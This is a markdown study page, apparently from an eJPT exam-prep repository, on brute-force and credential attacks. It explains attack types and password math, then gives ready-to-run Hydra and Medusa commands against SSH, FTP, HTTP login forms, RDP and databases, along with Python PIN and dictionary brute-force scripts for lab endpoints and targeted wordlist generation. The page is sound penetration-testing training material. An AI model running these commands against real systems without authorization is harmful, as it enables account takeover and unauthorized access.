[← Back to Home](../README.md)

# 05 — Brute Force & Credential Attacks

*(Prepared specifically around the eJPT exam's brute-force sections.)*

## Part 1 — Theory

### What Is Brute Forcing?
An **exhaustive guessing attack**: trying every possible combination of a password or PIN until the correct one is found. Success depends on three factors:
- **Password complexity** (length + character variety).
- **Attacker compute power** (GPU/CPU).
- **Existing defenses** (account lockout, CAPTCHA).

### Types of Brute-Force Attacks

| Type | Idea | When to use it |
|------|------|-----------------|
| **Simple brute force** | Try every possible combination literally | No prior information, and you have time/resources |
| **Dictionary attack** | Use a ready-made wordlist (e.g. `rockyou.txt`) | Targeting a weak or commonly-used password |
| **Hybrid attack** | Dictionary + brute force combined (e.g. appending a number or year) | A periodic password-change policy where users make small tweaks |
| **Credential stuffing** | Reuse credentials leaked from one breach against other sites | The victim reuses the same password everywhere |
| **Password spraying** | Try one common password across many usernames | Avoiding account lockout |
| **Rainbow tables** | Precomputed hash → plaintext lookup tables | You have a hash and want to reverse it quickly |
| **Reverse brute force** | Many passwords against a single known username | The mirror image of the standard attack |
| **Distributed brute force** | Spread the workload across multiple machines | The password space is extremely complex |

### Password Security Fundamentals
- **NIST guidelines:** length matters more than complexity — favor long **passphrases**, and don't rotate passwords on a fixed schedule unless there's evidence of compromise.
- **Default credentials** remain the single biggest weakness in devices (routers, cameras, printers) and must be changed immediately.
- **Common defaults:** `admin:admin`, `admin:password`, `root:root`, `cisco:cisco`, `ubnt:ubnt`.

### The Math Behind Brute Force
```
Possible Combinations = Character Set Size ^ Password Length
```
- 6 lowercase letters: `26^6 ≈ 309 million`
- 8 lowercase letters: `26^8 ≈ 209 billion`
- 8 mixed-case letters: `52^8 ≈ 53 trillion`
- 12 characters, full character set: an astronomically large number

> **Rule of thumb:** every additional character multiplies the difficulty many times over.

### Dictionary & Hybrid Attacks in Detail
- **Dictionary attacks** live and die by wordlist quality: `rockyou.txt`, `darkweb2017_top-10000.txt`, `2023-200_most_used_passwords.txt`.
- **Hybrid attacks** exploit predictable patterns — e.g. a user with password `Summer2023` under an annual rotation policy will likely switch to `Summer2024` or `Summer2023!`.
- **Credential stuffing** exploits **password reuse**, which around 80% of people practice in some form.

## Part 2 — Tools

### Hydra
The most well-known brute-force tool in ethical hacking, supporting **parallel connections** (many passwords tried simultaneously).

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

| Option | Meaning |
|--------|---------|
| `-l` | Single username |
| `-L` | Username wordlist |
| `-p` | Single password |
| `-P` | Password wordlist |
| `-t` | Number of parallel threads |
| `-f` | Stop on first valid credential found |
| `-s` | Non-default port |
| `-v` / `-V` | Verbose output |

### Medusa
An alternative to Hydra — sometimes faster, with a **modular design** (each protocol is a separate module).

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

| Option | Meaning |
|--------|---------|
| `-h` | Single target IP |
| `-H` | File of target IPs |
| `-u` | Single username |
| `-U` | Username wordlist |
| `-p` | Single password |
| `-P` | Password wordlist |
| `-M` | Module name (ssh, ftp, http, etc.) |
| `-t` | Number of threads |
| `-f` / `-F` | Fast mode (stop after first success) |
| `-e ns` | Also try empty passwords and username-as-password |

### Basic HTTP Authentication
The server responds with `401 Unauthorized` and requests credentials. The browser sends them in a header:
```
Authorization: Basic <base64(username:password)>
```
```bash
hydra -l basic-auth-user -P passwords.txt 127.0.0.1 http-get / -s 81
```

### Login Forms (HTTP POST)
Most web apps submit credentials via an HTML `<form>` as a POST request. Hydra's `http-post-form` module handles this.

```bash
hydra ... http-post-form "path:params:condition_string"
```

**Condition string (the most important detail for the exam):**
- `F=Invalid credentials` → treat this response text as a failure.
- `S=302` → a 302 redirect status means success.
- `S=Dashboard` → finding "Dashboard" in the response body means success.

```bash
"/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### Custom Wordlists
Generic wordlists won't cut it against a specific individual or company.

**Username Anarchy** generates every likely username permutation from a name (`janesmith`, `jsmith`, `j.smith`, `js`):
```bash
./username-anarchy "Jane Smith" > usernames.txt
```

**CUPP** interviews you about the target (name, birthdate, pet, partner, employer) and generates a tailored wordlist:
```bash
cupp -i
```

**Filtering a wordlist against a password policy:**
```bash
grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > filtered.txt
```

## Part 3 — Practical Cheat Sheet

### Step 0 — Recon
```bash
# Enumerate open ports
nmap -sV -sC -p- <TARGET_IP>

# Check locally listening services after landing an SSH shell
netstat -tulpn | grep LISTEN
```

### Hydra Cheat Sheet

**SSH**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -l admin -P passwords.txt -s 2222 <IP> ssh          # non-default port
hydra -l root -p toor -M targets.txt ssh                  # multiple targets
```

**FTP**
```bash
hydra -L users.txt -P passwords.txt ftp://<IP>
hydra -L users.txt -P passwords.txt -s 2121 <IP> ftp      # non-default port
```

**HTTP Basic Auth**
```bash
hydra -l basic-auth-user -P passwords.txt <IP> http-get / -s 81
hydra -L users.txt -P passwords.txt www.example.com http-get
```

**HTTP login form (POST) ⭐**
```bash
# Failure condition
hydra -L users.txt -P passwords.txt -f <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# Success condition (302 redirect)
hydra -l admin -P passwords.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# Success condition (keyword match)
hydra -l admin -P passwords.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"

# Non-default port
hydra -L users.txt -P passwords.txt -s 5000 -f <IP> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**RDP**
```bash
# Brute force with a defined character set (6-8 chars)
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 <IP> rdp
```

**MySQL / MSSQL**
```bash
hydra -l root -P passwords.txt mysql://<IP>
hydra -l sa -P passwords.txt mssql://<IP>
```

### Medusa Cheat Sheet

```bash
# SSH
medusa -h <IP> -u root -P passwords.txt -M ssh
medusa -h <IP> -U users.txt -P passwords.txt -M ssh -t 5

# FTP
medusa -h <IP> -u ftpuser -P passwords.txt -M ftp -t 5

# HTTP Basic Auth
medusa -H targets.txt -U users.txt -P passwords.txt -M http -m GET

# Web login form
medusa -M web-form -h <IP> -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"

# Empty / default passwords ⭐
medusa -h <IP> -U users.txt -e ns -M ssh   # -e n = empty, -e s = same as username, -e ns = both
```

### Scripting Brute Force (for Labs)

**4-digit PIN brute force**
```python
import requests

ip = "127.0.0.1"
port = 1234

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"[+] PIN Found: {formatted_pin}")
        print(f"[+] Flag: {response.json()['flag']}")
        break
```

**Dictionary attack**
```python
import requests

ip = "127.0.0.1"
port = 1234

url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt"
passwords = requests.get(url).text.splitlines()

for password in passwords:
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"[+] Password Found: {password}")
        print(f"[+] Flag: {response.json()['flag']}")
        break
```

### Preparing Wordlists

```bash
# Download popular lists
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

# Filter by policy (example: 8+ chars, upper, lower, number)
grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' > filtered.txt

# More complex filter (6+, upper, lower, number, 2+ special chars)
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

# Generate targeted usernames
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy "Jane Smith" > usernames.txt

# Generate targeted passwords
sudo apt install cupp -y
cupp -i
```

## Exam Golden Tips

| Tip | Explanation |
|-----|-------------|
| **Scan first** | Use `nmap` to identify the port/service before attacking it |
| **Basic Auth vs. Form** | `401 Unauthorized` → use `http-get`. An HTML `<form>` → use `http-post-form` |
| **Condition string** | Look for words like "Invalid", "Wrong", "Incorrect" in the failure response and use `F=` |
| **Default creds first** | Try `admin:admin` or `root:root` before launching a full brute force |
| **Empty passwords** | Use `-e ns` in Medusa, or a blank password in Hydra |
| **The flag** | In labs, the first `200 OK` containing `flag` in the JSON means you're done |
| **The math** | If asked for the number of combinations: `character set size ^ length` |
| **The distinction** | Dictionary = a fixed list. Brute force = every possibility. Hybrid = both combined |
| **Hydra vs. Medusa** | Hydra is easier for web forms; Medusa is sometimes faster against network services |

## Related Pages

- Cracking hashes you obtain along the way → [Password Cracking & Hash Attacks](06-Password-Cracking-and-Hash-Attacks.md)
- Applying this against specific services → [Service Exploitation Deep-Dive](03-Service-Exploitation-Deep-Dive.md)
